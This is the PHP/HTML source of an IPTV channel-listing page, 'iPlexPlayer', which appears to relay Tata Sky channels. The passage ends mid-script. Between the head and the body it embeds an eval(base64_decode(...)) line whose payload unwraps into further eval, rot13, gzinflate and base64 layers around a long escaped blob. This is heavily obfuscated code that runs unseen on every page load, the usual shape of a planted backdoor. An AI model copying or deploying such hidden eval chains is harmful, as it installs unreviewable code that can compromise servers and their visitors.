
<!DOCTYPE html>
<html>

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />

<head>
<title>iPlexPlayer </title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="http://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <link rel="stylesheet" href="css/channels3f22.css">
    <link rel="stylesheet" href="css/nav3860.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/iconify/2.0.0/iconify.min.js"></script>
    <style>
        .stwBlurRainbowTop,
        .stwRainbowTop {
            position: fixed;
            width: 100%;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            z-index: 288883;
            background: linear-gradient(-45deg, #4086f4, #31a952, #fbbe01, #ff311f, #ff00cc, #4086f4, #31a952, #fbbe01, #ff311f, #ff00bb);
            background-size: 200%;
            -webkit-animation: animeBar 5s linear infinite;
            animation: animeBar 5s linear infinite
        }

        .stwBlurRainbowTop {
            height: 11px;
            z-index: 28882;
            filter: blur(15px);
            opacity: .7
        }

        @-webkit-keyframes animeBar {
            0% {
                background-position: 0 50%
            }

            50% {
                background-position: 100% 50%
            }

            100% {
                background-position: 0 50%
            }
        }

        @keyframes animeBar {
            0% {
                background-position: 0 50%
            }

            50% {
                background-position: 100% 50%
            }

            100% {
                background-position: 0 50%
            }
        }
    </style>
</head>


<?php eval(base64_decode('CiBldmFsKHN0cl9yb3QxMyhnemluZmxhdGUoc3RyX3JvdDEzKGJhc2U2NF9kZWNvZGUoIlx4NGNcMTI1XDE1Nlx4NDhceDQ0XDE2M1x4NTFceDMyXHg0NFwxNjZcNjJceDYxXHg0OVx4NGVceDZkXHg2MlwxNDVceDM4XDEwN1x4NjVceDMzXHg0OFwxNjZcMTY2XHg1YVx4NmJceDdhXHg1OVx4MzRcNzFceDM3XDE0MlwxNjVceDQ4XHgzMVw3MVx4MzVcMTEwXDEwNVwxMTZceDQxXDY2XHg1YVx4NDFceDUyXDE0MVwxMjNceDcwXHg3OFx4MzFcMTIzXHg3NFx4N2FceDU3XHg3Nlw1N1x4NzRceDUxXDcxXHg1NVx4NzVceDc0XDYxXHg3N1wxNjRcMTQ2XDY0XDYxXHg2YVwxNDVcMTI2XDEzMFwxMzFcMTIwXDcxXHg2Mlw2MVwxNTJceDZjXHg2Mlx4MzFcMTYyXDUzXHg0Ylx4NzNceDYxXDYyXDExNFx4MmJcNTdceDJiXHg0Y1x4NTBcMTcyXHg1NlwxMjFcMTI1XDE2M1x4NzRcMTMyXHgzNFx4NmNcNjJceDVhXDU3XHg3N1x4NTBcMTcwXDEwMlx4NDRcMTQ3XHg1NVx4N2FceDRjXDEwMlw2NVx4NTlcMTI0XDY2XDEzMlx4MzJcMTcyXHg3MVwxNTVceDU1XHg2Ylx4NzVceDU5XHg0N1w2Mlx4NDZceDUxXDEwM1x4NGJceDQyXDEwN1x4NDRceDZlXDE0Mlw2NVx4MmZceDc0XHg0Ylx4NDJcMTI0XDEwNVx4NTVcNTdceDQyXHg1OFx4NjdcMTEyXHg3NFx4MzNcMTQ0XHg1OVwxNDZceDc5XHg1N1x4NmRcNTdceDc3XDExN1x4NzhcNTNcMTUzXHg3M1x4NDVcMTExXHg2OFx4NDRceDU1XDEwM1wxMjFceDMwXHg2NVwxMDZceDMyXHg2N1wxNDFceDY1XHg0YVx4NzJcMTU3XDEyM1wxNTFcNjFceDZhXHg2NVwxNTVcMTIyXDU3XHg2ZFx4NzFceDRhXHg2ZVwxNDVcNTdceDRjXDE3MVwxNTZcMTExXHg3YVwxMTdceDY3XHg0ZVwxMzBceDJiXHg3Mlx4NDNcMTE0XHg1NFx4MzZceDQ1XHg0MVx4MzZceDRhXDE0Mlx4NjVceDRhXHg3NlwxNzFceDQ1XDUzXDEwNFwxNTFceDZmXDE2M1x4NDZcMTA1XHg2YVw2MVwxNDFcNTdceDcwXHg1Nlx4NDVceDRjXHgyYlwxMDJcMTUxXDEzMlx4NmVceDM5XHg2OFwxMTBcMTY0XDEzMlx4NGFcNjJcMTE0XDE2NVw1M1x4NzlceDZiXHg2YVw3MFx4MzRcMTUwXDExMFw3MFw3MVwxNTBcMTMyXDEyMFwxNjJceDUzXHg2NVwxNzFceDRlXHg3MVwxMzBcMTE1XDEwMlwxMjVcMTI1XHgyZlwxNjZcMTA1XDE3MVx4NTJceDJiXDE0Mlx4NDVceDQ4XHg0OVwxMjJceDQ1XHg2Zlw3MFwxMzBcMTYxXDE2N1x4NzFcNTdceDM0XHg3M1x4MzZceDQ4XHg0MVx4NTNceDQ5XHg2YVx4NmJceDY3XDE3MFx4NTFceDM2XHg2NFwxNzFcMTUwXDEyN1x4MzlceDVhXHg0ZVx4NjNceDdhXHg2Y1x4MzlcMTIwXHg0NFx4NmFcMTA3XHg0MVwxMDZcMTQ0XHg3Nlx4NzZceDVhXHg0NVwxNTFceDMwXHgzOVx4MzFceDMyXDEwNFw2MFx4NDRcMTYwXHg0ZFx4NzBceDRiXHg1NVx4NjNceDZlXDE1N1x4NWFcMTY2XHg0ZVx4NGVcMTQ0XHg0YlwxNzJcMTU1XDExMlwxMDNcMTQxXHg3Mlx4MzBcMTYxXDYwXDEwNlwxMTBceDM3XDE3Mlx4NDlceDY4XHgzN1x4MzJceDUyXHg2OVx4MzdceDY5XDE1Mlx4NjlceDRjXDE3MlwxMDJceDUwXHgzNlwxMTJcNzFcMTU3XHg3M1x4NWFcMTIxXDE3MVwxNDFceDcwXDE3MlwxNjBcMTIwXHg2Zlx4NzVcNjNcNjJcMTAyXDU3XDE1NVwxMTVcMTUyXDE1MFwxNjZceDRhXHg1N1w2MFwxMzFceDY3XHgzMlwxNTFceDY5XDExMVx4NTNcMTE3XHg0ZVwxMDRceDQ5XDE3MVx4NjlcMTYwXDYyXDY1XHg3M1w2MlwxNDVcMTI1XDE0NVwxNDJceDdhXHg0Mlx4NjhceDMxXHg2YVwxMjZcMTQ2XDEyNVx4NGRceDMzXDEzMVx4NmZcMTAzXHg0NFx4NTJcMTU0XHg1MVw2N1x4MzRcNTNcMTExXHg2YVwxNjZceDU4XHg0NVwxMTVceDZkXHg3OVwxNDJceDM3XHg0MVx4NGNceDRiXHg3Nlx4NmVceDQxXDE2MFwxNTBceDcyXHg0OVw2NVwxMDJceDY1XHg2Zlx4NjhcMTQzXDY2XDE2M1x4NjRceDU0XHg1YVwxMDZceDM0XHg0NFwxNzBceDQxXHg2ZFx4MzlcNjZceDQ2XHg1NFx4MmJcMTE3XHg2OVx4NjRceDY0XHg3M1x4NjZcMTUxXHg0ZlwxMDVceDY5XDE1NFx4NTBcMTMxXDY0XDEyNFwxMjdcNjJceDUzXDExMVwxMTFcMTI0XHg2ZFx4NThceDRmXDE2N1x4NDhcMTU0XHg2NlwxMjVcMTE2XDE0NlwxNjFcMTE3XHg2Nlx4NDlceDM4XHgzNlw2NVx4NjJcNjVcMTYyXDE3MlwxMTJcMTUwXDE2N1wxNDZcMTA2XHg0OVx4NGNceDRkXHg3MVwxMzJcNjVceDRlXHg3Nlx4NzVceDY0XHg2NFx4NjVcNjdceDMzXHg3YVx4NzFcMTIyXHgzNlx4MzBceDczXDEyMlw2M1x4NTZceDcwXHg2MlwxMTVceDQ1XDExM1x4NTdceDZmXDY0XHg1N1wxMDVceDZkXDExNlw2NFx4NGZcNjVcMTUzXHg1M1wxNTdceDQ0XHg2ZVx4NDZceDU5XHg3OVw2MFx4NmZcMTUxXDE2M1wxMjVcNjBceDc4XDE1MFw3MFx4NGRcMTAzXDExNlx4NmFcMTI2XDExMFx4NzBcNzFcMTUxXDEyM1w2MVwxMjJcMTY3XDE2N1w1N1x4NmNcMTEwXHg1OFwxNjNceDVhXHg2OFx4NTVcMTY2XHg2MVx4NjVcMTcxXHg3YVx4NTJcMTI3XHgzOVwxMTdcMTQ0XHg1OVwxNjFcNTdceDZkXDE0NVx4MzRceDcwXHg2OFx4NTlceDQ4XDExNlx4NTdcMTE1XDE2NVw1N1wxNDZceDczXDEyNlwxMDFcMTYwXDcxXDExN1x4NGZceDM3XHg0Mlw2MFx4MzdceDc1XDcwXHg2ZFwxNTZceDU1XHg3NlwxMzFcNjdcNzFceDY2XHg0YVwxMjVcMTE3XHg1YVw2MVw1N1w1N1x4MmZcMTYzXHg1YVwxMzJceDRhXHg3NlwxNjVcNjBcMTU1XDE2NFwxNTBcMTUxXDExM1wxNTNceDQzXDE2N1x4NjFcMTI1XDEwM1x4NTFceDRhXHgyZlwxNDdceDM1XDE2NVx4NWFcMTY3XHg3NVwxMTNcNjJcNzFcMTE3XDE2NlwxNDVceDU5XHg3Nlx4NzhcMTE2XHg2ZlwxMjFcMTI1XDcxXDE2NVx4MzBceDM0XDExMlx4NjFcMTQ3XHg0MlwxNjFceDY5XDE3MVx4MzZcMTIwXHg3N1x4NjNcNjFceDc2XHg0MVwxMDFcMTE2XDEyNlx4MzVcMTA1XHg2OFx4NTFcMTU1XDExNVx4NjNceDQxXHg3M1x4NGJceDU4XDYwXDE2N1wxMjZcMTYxXHg3N1wxMjdceDMyXHg0NFwxNDJcMTI0XDEwMVx4NzFceDczXDYxXHg3NlwxNTVcMTUzXDUzXHgzMVwxMTBceDU1XHg2OFwxMTJcNTdceDQ0XDEwNlx4MzJceDM4XDE2NlwxMDVcMTAxXHg0ZVw3MFw2N1x4NzZcMTMyXDEyMFx4NjVceDQ5XDEwNFwxMzJcMTU0XHgzNVwxNDVceDcwXHg2NVx4NWFcMTQzXHg0NFwxNTJceDUxXDE1N1x4NGJcMTUwXHgzNlwxMzJcMTA1XHgzOVx4NDdcMTY2XDExMFwxNjZcNTNceDM1XHg0N1wxMDZcMTAxXDEwMVx4NzFcMTY2XDE2MFwxNDdceDc1XDEwNFwxMjZceDU5XDcwXHg0OVwxNTZcMTExXDE3MFwxMjdceDYxXDEzMFwxNTFcMTIxXDY0XDE2Nlx4MzhcNjVcMTYyXHg3NlwxMjFcMTYxXDEyNlx4NTNcNjFceDU3XHg3Nlx4MzNcMTY1XHg2M1x4NDRcMTcwXHg0Zlx4NDJcMTQ0XDE2NlwxMTBceDQ1XHgzNVx4NjlceDQ2XHg1NFx4NzVceDc1XHgzOVwxMjZceDUzXHg3N1w3MFwxMTZcMTE2XHgzM1x4NzNcMTU3XHgzMlwxNzJceDU1XDE1NFx4NTBceDJmXHg3OFx4NzJceDY1XHg0YVx4NGFceDc3XDE2M1w3MVx4NGFcMTEyXDE2MFx4NjlceDJmXDE1MFx4NmZcMTAzXHg3YVwxNjNcMTYwXDYwXHg0ZlwxNjFcMTY3XDExMFx4MzBcMTY2XDEyNFwxNDZcMTIyXHg3MVwxNDFcMTIyXDE2M1x4MzBcMTY3XHg3N1x4NjVceDRkXDUzXHg0NVx4NjVceDU2XDE1MVwxMjVceDY5XHg2M1wxNDZceDY2XHgzMlx4MzlceDQxXHgzMFx4NDFceDdhXHg2MVx4NzlcNjNcMTcyXDEwMlx4NTdceDRhXDE2NVwxMDdcMTQ1XHg1MlwxNTdceDc4XHg2Zlw2M1x4MzZcMTY0XDEyMVx4NjdceDRiXDEyN1x4NjhcMTU0XDcwXHg1NlwxNzFcMTUzXDY2XDY3XDE2MFw3MVwxMDNceDMzXDEzMVw2NlwxMjVcNjRceDZiXDEyM1x4MmZceDQ1XHgyYlwxNDFceDU1XDE2M1x4NmZceDc3XHg2NlwxNjBceDQ1XHg0M1wxMDdceDUxXHgzMlwxMzBceDU4XDcxXHg0NlwxMTJcMTA2XDEzMFwxNjdceDMxXHg3N1wxMjFcNjRceDZmXHg2ZFx4MzNcMTU2XDUzXHg2M1wxNjZceDUxXDEwMlx4NThcMTMyXHg1M1x4MzRceDczXDEwMVx4NjNcMTI3XDEyMlw2MVx4NjNceDU3XHg0NFx4NGRceDYzXHgzOVx4NGRcMTE2XHg1Nlx4NGJcMTEwXDEwNVwxMTZceDRkXDExN1x4N2FceDUzXHg0M1wxNjBcMTY0XHg0N1x4NThcMTE3XDE1N1x4NDNceDU0XDE2MlwxMTRceDcwXHg3NFwxNTJceDQyXDExMFx4MzBcMTQ3XDE1Nlx4NjJceDMyXDE0Mlx4NzFceDQxXHg3OFwxNDZcNjdcMTQxXDUzXDYwXHg1MVwxNTBceDU4XDE2N1x4NmVceDU2XHgzN1x4NDRcMTYxXHg2OFwxMzBceDRmXHg1MVwxMzFceDc3XDE2NFx4NDZceDcwXDU3XHg3NVwxNDRceDZjXDExNlw3MFwxNDVcNzFcMTYxXDYxXDE0MVwxMDdceDczXDEwM1wxMjdcMTA2XDE2Mlx4NzFceDU0XDEyNVx4NTlcNjVceDZkXHg2ZlwxMjRcNjZceDUzXDEyM1wxNzBcMTUzXDU3XHg2NlwxNDJceDRlXDY0XDEzMVwxNjZcMTYxXDExMlw2NlwxMDVceDU2XHg3MlwxMTJcNTdceDcwXHg2OVx4NGNcMTcyXDExNVx4MzBcMTYyXHgzNVwxMjFcMTE0XHg2Mlx4NmFceDY1XHgzMVx4NzJceDQ2XDY1XDcwXDExNFx4NjFcMTI3XDEwNVx4NmNcNjFcMTEzXHgzOFwxMDNceDQ1XDY1XDY0XHg2ZVx4NzlceDUyXDExMFx4MzBcMTA3XDE0M1x4NjRceDQ3XHg2MVx4MzJceDUwXDE1Mlx4NTFceDRjXHg0NVw2MFx4NTZcMTE2XDExM1wxMjBceDRlXHg3NlwxNTFceDM5XDE0N1x4NmFceDUzXDUzXDYxXHgzMFx4NjNcNjNcNzBcMTE3XHg0Mlx4NzJcMTU2XDE1NFwxNTZceDM4XHg3Nlw2NFx4NmRcMTQxXDEyNFwxMTFceDU4XDEwNFwxMTRceDY4XDEyMFx4NzJcMTI0XHg2OFwxMjFceDcyXDE1M1x4NzRcMTAxXHg1Nlx4NTdceDYzXHg2ZFwxNzFcMTA0XDY1XHg1NVwxNjdceDcxXHg0ZVwxMjZceDcwXHg0YVwxMjJceDQ2XHg1M1wxNTRcMTAyXHg0Nlx4NWFceDZkXHg0ZVwxNTNcMTU3XHgzMlwxMDdcMTcwXDEyMlx4NDdcMTA3XDYzXHgyZlwxNTJceDQ0XDEyMFx4NjRceDdhXHg0NVx4NDNceDM1XDE2MVwxNTdceDY3XDE2N1wxMzJcNzFceDZlXHg1MVw2Nlx4MzdceDM4XHg3YVx4NDhceDUzXHg1NFx4NmVceDQ0XDEwNVwxMjVcNjJceDc2XHg3NFx4NDlceDM2XDEyNVx4NjJcMTI1XHgyYlwxMzFcMTQ0XHgzNVwxNjZceDRlXHg0N1x4NWFcMTUzXDE2MFx4NmFceDYzXHg1NFwxNjFceDcyXDUzXHg2Mlx4NGNceDc1XDExNVx4NzRcMTE2XDEyNFx4NGNcMTYwXHg3MFwxNzFcMTUyXHg2MlwxNjNceDU2XDE0M1wxNjVceDY3XHg0Nlx4MzlcMTYwXHg2ZVx4N2FceDQ3XHg2OFx4NTZcMTMxXDEyMVwxNjdcMTQ0XHgzN1w2N1x4NzdcNjVcMTEyXHg1OVwxMjVcMTQzXDcxXDE0Mlx4NzdcMTEwXDEyM1wxNjFcMTY2XHg1MFx4NjVcMTYwXHg2N1w2MFx4NDJceDYzXHg1OFx4NGNceDM0XHg0ZFwxNzBcMTQxXDEyMFx4NThceDQ4XDEzMlx4MzlceDc4XDY0XDE0MlwxMTVcMTAzXHgyYlx4MmZceDZlXDcxXHg1N1wxMjNceDMyXDE2N1wxMzFceDU4XHg0YlwxNjdceDc3XHgzMVx4MmJcNjNcMTY0XDEyNVwxNTdcMTYxXHg2Ylx4NGNcMTEyXDE2NVx4NjNcNTNcMTIzXDcwXDU3XHg2YVwxMjNcMTIwXDEyNVx4NjdcMTY2XDExNlwxMDNceDY1XDY3XHg2NVwxMTJceDM1XHgzNlwxMjVcNjZceDRjXDY3XDY0XHg1Mlx4NjdceDM1XHg1MFx4NTBceDc5XHg3NFwxNDVcNjJceDYyXDE3MFx4NjRcMTY2XHg2Ylx4MzRcMTA0XHg0ZVwxNjNcMTI1XHg3OFx4NzBceDczXHgzMVwxNjdcMTI2XHg2NVx4NTJcMTA1XHg2ZFwxMDdcNjBcMTUwXHg0M1x4NGJcMTY1XHgyZlwxMTdcMTA0XHg2NFx4NjJceDU1XDE0M1wxNjRceDcwXHg3MVx4MzRcMTY1XDExMlwxMTVcMTIwXHg3Nlx4NTdceDQyXDE1NFx4NjlcMTA3XDcxXDE2Nlx4NjJcMTUzXDE1MFwxMjFceDU2XHg0OFx4NDlcMTExXHg0Nlx4NmVceDcxXHg0MlwxMjBceDc3XDE2MVx4NTZcMTQxXHgzMlwxNDJcNjJcMTE0XDYwXDE2MFx4NGVcMTE0XHg1M1wxNjdcMTcxXDEwMlwxMzJcMTU1XDE2Mlx4NmNceDRiXDUzXHg2MlwxMDNcMTQxXDEwNlx4NmJceDMyXHg2NVx4NzJceDY3XDE2NFx4NDZcMTQxXDE1NlwxMjBcMTEzXDExMVwxNzFcNTdceDJmXHg0NVwxNjVceDMxXHg3NVw2Nlw2MFx4NThceDMyXDE0NVwxNjFcMTIwXDYyXHg3OFx4MzZceDY5XDE0MVw2MVx4NzBceDRkXHg1YVwxMjFceDYxXHg0ZFx4MmZceDc1XHg3MVx4NzFcMTAzXHgzN1x4NTlceDZmXDExNFx4NmNceDZlXDEyMlx4NmZcNjNcMTA1XHg2ZlwxNjBceDYxXHg0NFx4NTRceDczXDEwMlwxMTRceDUyXHg3NFwxMDZceDVhXDE1MFx4NzFcMTY0XDEwNFwxMzBceDRhXDE1NFwxMDFceDU5XDEyNFx4NjNceDY0XDE2MVx4MzhceDc1XHg0M1wxNjdcNjdceDZiXDEzMVx4N2FcMTE2XHg0NFwxNTRcMTMwXHg1N1w2NVx4NGFcMTY3XHgzMlwxMjFceDZhXDE0N1wxMTNceDdhXDEzMFx4NGFceDMwXHg1MVwxMDZcMTExXDExNlwxNjVcMTcwXDEwN1x4MzBcNjNceDU1XHg1M1wxNzJcMTYxXHg1NVwxMzFceDU4XHg2ZVw2MVwxMTdcMTIyXDcwXDE1MFwxNjRceDQ2XHg0MVx4MzNcNjBceDYxXHgzOFx4NTNcNTdceDUwXDY0XDYxXHg0OVwxMjRceDZkXDYwXHg0Y1w2MVwxMDZceDc2XDUzXHg2N1x4NzdcMTQ3XDE0NFw2N1wxMjNceDU4XDYwXDE2MVwxMDJceDQ3XHg3MFx4NzdcMTYxXDE1M1wxNjRceDRiXHg3NlwxNTBceDczXDE2Nlx4MzlceDZkXHg3MVwxNjRcMTQ1XHgzMlwxMDdcMTYzXDUzXHg2OVx4NWFceDQ4XHg1NFx4NTZceDc4XDE1M1wxNDFcMTA0XHg3MVx4NGFcNjFceDY5XDE0M1w1N1wxNjBceDYzXDY2XHg0ZFwxMDVcMTEwXHg2YlwxMjJceDYyXHgzOVx4NTJceDYyXHgzOFx4MzFceDU5XHg2Nlx4MzJcMTE0XDY2XDY2XDY2XHg2Y1wxMTFcMTExXHg2M1x4NjFcMTIzXHg2MVx4NTlceDcyXHg0ZFwxNDVcMTIxXDE2M1x4MzJceDQ1XDE2MlwxMDFceDc3XHg2YVwxNTVceDVhXHg2ZlwxNDNcMTUyXHg1NlwxMzFceDc1XDE3MFwxNTVcMTcwXDE2NFx4NjdceDQ1XDExMFwxNDNcMTI3XHg0NVx4NThcMTQyXHg3NFx4MzRceDRjXDcwXDE0Mlx4NDhcMTY1XHg2M1wxMjFceDczXDE2NVwxNzFcNTNceDY3XHg1YVx4NTVcMTE0XDE1MFwxMTNceDU1XDEyN1wxMTBceDZhXDExMVx4NjRceDUxXHgyZlwxNDVcMTIxXDEwNlx4MzlcMTA3XHg1MVwxMTBceDM1XHg3OVwxNTNcNTNceDUyXHg2MVwxMDZceDU5XDE1MVwxMzFceDY4XHg2NlwxNzFcMTIzXHgzOFwxMjNcMTIyXHg0ZFx4NTFcMTExXDExMVx4NjdceDYyXHg2OVwxNDVcMTY2XDEwMlwxNjZceDc1XDE3Mlx4NjVcNTdceDVhXHg1MlwxNjNceDQ3XDcwXHgzOVx4NmJcMTYxXDE1NlwxNzBceDUxXDE2M1w2MlwxNjRcMTIwXDExMFx4MzZceDQ4XDYyXDExM1wxMjFceDZlXDE0NlwxNTdcMTUyXHg2Y1wxNTJceDcyXDEyMlwxNDFcMTYyXHg1MVx4NDFceDUxXHg2M1x4NDhceDMzXHg1MVx4NTlceDU2XDYxXHg2Y1wxMjdcMTIyXHg0OFx4NjJcMTI0XHgzOFwxNzJcMTY3XDYxXDE0NlwxNzFcMTYxXHg3YVx4NjNceDJmXDE3MFwxMjJcMTE1XHg3Mlx4NmNcMTcxXHgzNFx4NzNceDQ3XDExMFwxNjJceDY0XHg1MFwxNDJceDM5XDE1NFx4NGFceDM5XDEyMVw2MVwxNjFceDc2XHg2MlwxMDNceDdhXHg0ZFx4NTFcMTE0XDEyNlx4NGJceDQzXDYyXHg0Y1x4NGRcNTNceDUzXHg2NFx4NTRcMTU3XHg0NlwxMjJceDY2XDE2Mlx4NzJcNjNcMTEzXDEwM1x4NjZceDUwXHg0Zlx4NDhceDMzXDY0XHg1MFx4NTdcMTY1XHg1YVx4NjNcMTIwXHg2ZVx4NzFcMTYyXHg3NlwxNTVcNjJcMTA3XDE0Nlx4NGJcNzBcMTA2XHg0Zlx4NjlceDUyXHg3OVwxMjZcMTE0XHg2YVx4NTZcMTYxXHg2OFx4MzVcMTYzXDcwXDE2NlwxMTJceDU1XDEyNlwxNDJcNjRceDQ5XDEyMVwxMjVcMTE2XHg0NVx4NjVceDcxXDExNVx4NDlcMTI2XHg0YlwxNjJcMTIwXHgzMFwxNTNcMTEwXDE2NFwxNDZceDc1XHg2ZFx4NTVceDQ3XDExMVwxNDRcMTUyXHgzOFwxNjFcMTUwXHg1N1x4NGZcNjNceDUxXDE0M1x4NzJcMTE0XHg1MlwxNDRceDU4XDEwM1x4NmNcMTU1XDE1MFwxNDZcMTcwXHgzNFwxMjNcNjBcMTA2XHgzOVx4NzJceDczXHg3NlwxMzJceDMyXHg2N1wxNTdceDM5XHg0Mlx4NTRcMTAzXHg0YVx4NThcMTU1XHg3YVx4MzlceDY3XDYzXDE0M1w2MVx4NzZcMTAxXHgyZlwxNjFcMTE2XDE3MVx4MzRceDU4XDE0NVwxMTBceDc1XDEzMVx4MmZceDJiXDE1MlwxNzBcNzBcMTIwXDEwM1x4NDJcMTQ1XDE0N1wxNDNceDQ3XDcwXDE3MVw2MFx4NmVceDczXHg0OFwxMTFceDYyXHgzMFwxNjNceDY2XDYxXDE2NlwxNzBceDMzXHg1OVwxNzJceDMyXDY2XDE1Mlx4MzBcMTE2XDEyN1wxMTRceDczXDYyXDY1XHgzNVx4NDZcMTA1XDEyNFx4NjdceDZmXDE0Nlx4NzVceDM0XHg1NFx4MzZcNzBcMTAxXDE0Nlx4MzJcNTdceDYzXHg1MlwxNTFceDY3XDEwM1x4NTFceDc4XDEwMVwxMTVcMTA0XHg1OFx4NGRcMTIyXHg3YVx4NTVceDY3XDE1MFwxMTdcMTIxXHg2Nlx4NTZcMTA2XHgzM1wxMjZceDMxXHg1MFx4NmJcMTEyXDEyM1x4N2FcMTU1XHg1NlwxMzJceDY1XHg1MVwxMTJcMTQ0XHgzOFwxNzBceDZlXDE3MVwxMTZcMTEwXHg1N1wxNzBcNTNceDU1XDE1N1wxNjBcMTY3XHgzOVwxMzJcMTEzXDExMlwxNzBcMTIwXDYyXHgzMlx4NjlceDM1XDEwNFwxNDFceDM5XHgyZlwxMzBceDRjXHg0OFwxMTFcMTUxXHgzMFwxNzJcMTYyXDYyXHg1MlwxMDFcMTI3XHg3OVx4NTRceDJiXDEwNVw2M1x4NTJcMTQ0XHgzNVx4NmJceDM1XDE2MFwxMTNcMTMyXDY3XDYwXDE1N1x4NzJceDM3XHg3MVwxNDdcMTMyXHg0NFx4NGZcMTA2XDEzMFx4NjRcMTQzXDEzMFx4NzdcMTUwXHg0ZVx4NDdceDY0XHg1M1wxNjNcMTIzXDYzXHg0NlwxMjJceDQ0XDE0Mlw2MFwxMTdcNjFceDVhXDEwNFx4NzdceDZjXDExM1x4NjVcMTUyXDExM1x4NThcNjVceDZkXHg2Y1x4NTZcMTE0XDE1MVwxMDJcNTdcMTIxXDE2MFwxMDZceDM5XHg0OFw3MFx4NTZcMTIyXHg1Mlx4N2FcNjVcMTE1XHg0M1wxMTZcMTIzXDEzMlw2NVwxMzBcMTAzXHgzMVx4MzlceDM3XHgzNFx4NDRcMTYyXHg2NlwxNTJcMTA0XHg2MVx4NTZceDU0XDEyNVx4MzZceDRlXDYwXHg3Mlx4NTZcNjBceDJiXDE2MFx4NDZcMTE2XDYxXDEzMlw2Mlx4NDRceDM2XDEwMVx4NzZcNzFcNzFcMTYyXDE3MVwxMTNceDRkXDEzMVx4NjNcMTExXDcwXDEwMlwxNjFcMTIzXHg0M1wxMjNceDY3XHg0OFwxNjJcNTNcNjVceDZlXHg1NVx4NTNceDU4XDEyNFx4NWFceDc0XHgzNVwxNjdcMTY1XDU3XHg0ZVx4NjFceDZmXDE3MVx4NWFceDY4XHg0ZFw2NVx4MzBcMTYyXHg1Nlx4NjFceDc5XDE0NVx4NjhcMTEwXHg2MVx4NjlcNzFceDM2XDYyXHg3OVx4NTBcMTU1XDEyNFwxMTBceDQ3XDE1N1x4NTBcMTI1XDE1MFwxNTVceDRlXHg3OFx4NGRcNjFcMTAyXHg3OFwxNDVcMTAyXHg1MFwxMTRceDJmXHg2ZlwxMjdcMTI2XHg3OVx4NjJcMTYzXHg3Nlx4NDJceDY2XDEwM1x4NzhceDc0XHg2MVx4MzRceDQ3XDE1MVx4MzVcMTQ2XHg0Nlx4NTJcMTY0XDEzMVx4NzVceDQ2XHg1OVx4NjRceDM5XHgyZlwxNzBceDczXDEzMVx4NmZceDRjXHgzMFwxMTdceDQxXDEwNlx4NTNceDYyXHg1NFx4NjlcMTAxXDE0MlwxMjZceDM3XDE2NFx4MzJcMTE1XDExNFx4NTZceDQ5XDEyNlwxNjNceDU4XHgzN1wxMTNcNjZcNzBceDRmXHg2N1wxMTdcMTIwXDEyMFx4MzlcMTA3XHg2ZVx4MzNcMTIxXDY2XHg2NVx4NGRcMTUxXHg2Mlx4NTdceDc2XHg0Zlx4NGNceDcwXHgzN1x4MzRceDcwXDY3XHg0MVwxNTVceDRkXDE2NFx4NmFceDYyXHgzNFx4NzZcMTEwXDE1M1wxNDVceDY4XHgzOFx4NjVceDRmXDE1NFw2NVx4NDFceDU0XDE1MFx4NTRcNjNceDRjXHgzNVx4NjRcNjJceDMwXDY0XDE1NFwxMTJceDRiXDEyMFwxMDVceDZiXDEyNVx4NmJceDUzXDE0N1w2NVwxNDFcMTExXHg0M1x4NTJcMTUxXHg1NFwxNTBcNjJceDZmXDUzXHgzN1x4NjhceDc0XDExNlx4NDJcMTE1XDEyMFw2MFwxNTRcMTIxXDEwM1wxMzFcMTYwXDYzXHg3NFx4NzJcMTI1XDEwNVx4MzRcMTQ1XDE2MlwxNzFcNjVcMTE2XDE0Nlx4NTRcMTYxXHg0M1x4NDhcMTMwXHgzNVwxNDFceDZhXHg0ZFx4NTBcMTUyXDE0NFx4NjlcMTQ2XHgzNlwxMzBcMTI3XHg2M1x4NDJcNjRceDM4XDE1Nlx4MzhcMTAxXHg2OFwxNTRcMTA3XDE0NFwxMjBcNTdcNzBceDQ0XDE1NlwxNjZceDJmXDUzXHg0NFwxMjFceDNkXDc1IikpKSkpOyA=')); ?>

<body>

</body>

<header style="display:fixed" class="header" id="header">
    <center><a id="head-logo-href"><img src="https://i.postimg.cc/4yX3jmZN/IMG-20230905-093100.png" style="width: 130px;margin-top: 7px;margin-left: 15px;" alt="Compart Logo"
                itemprop="thumbnail" width="210px" height="auto"></a></center>
   
    <br>
    <div style="margin-top:10px;z-index:9999;display:absolute;
background:silver;color:red;" class="no-items section" id="search_top" name="Search (Top)"></div>
<input style="display:sticky;visibility:visible;background:silver;color:brown;width:90%;height:35px;z-index:9999;margin-top:10px"
        class="fin" placeholder="Search here.." id="look_tv_here" type="text">
    <button class="bt2" type="button" id="look_tv_button" aria-label="Search">
        <span class="iconify" data-icon="el:search-alt" data-width="33" data-height="33"></span>
    </button>
</header>

<body>
    <div class="stwRainbowTop"></div>
    <div class="stwBlurRainbowTop"></div>
    <div style="height:64px;
height:var(--header-height);">
    </div>
    <center>
        <div class="main" id="ch_list" style="margin-top: 14px;"></div>



        <?php foreach ($channelsData as $channel): ?>
       
       <a href="play.php?id=<?php echo $channel['id']; ?>" class="popup-video">
         <div id="TataSky_Catchup" class="tvv-item">
         <div class="tvv-name-s">iPlexTv</div>
         <div class="tvv-name-t"><?php echo $channel['group']; ?></div>
         <img src="<?php echo $channel['logo']; ?>" alt="img" class="loading" loading="lazy" >
         <div class="tvv-name2">Tata.</div>
         <div class="tvv-name"><?php echo $channel['title']; ?></div>
         </div>
       </a>

    


       <?php endforeach; ?>
       
       <a href=""><div class="fire_row_load" id="fire_row_load"><button id="load_more_anbtn" data-page
                style="padding-left: 25px; padding-right: 25px; padding-top: 10px;font-weight:1000; padding-bottom: 10px;width:50%"
                class="btn-11 custom-btn"> Made By @sanjiblive</button></div></a> 
        <br><br><br>
    </center>



    <script>
    document.addEventListener('DOMContentLoaded', function () {
        // Get the input element for searching
        const searchInput = document.getElementById('look_tv_here');
        const tvvItemContainers = document.querySelectorAll('.tvv-item'); // Get all TVV item containers

        // Store the initial display property of TVV item containers
        const initialDisplayProperties = [];
        tvvItemContainers.forEach(function (container) {
            initialDisplayProperties.push(window.getComputedStyle(container).display);
        });

        // Add an event listener for the input element
        searchInput.addEventListener('input', function () {
            const searchTerm = searchInput.value.trim().toLowerCase();

            // Loop through each TVV item container and check if it contains the search term
            tvvItemContainers.forEach(function (container, index) {
                const tvvNameElement = container.querySelector('.tvv-name');
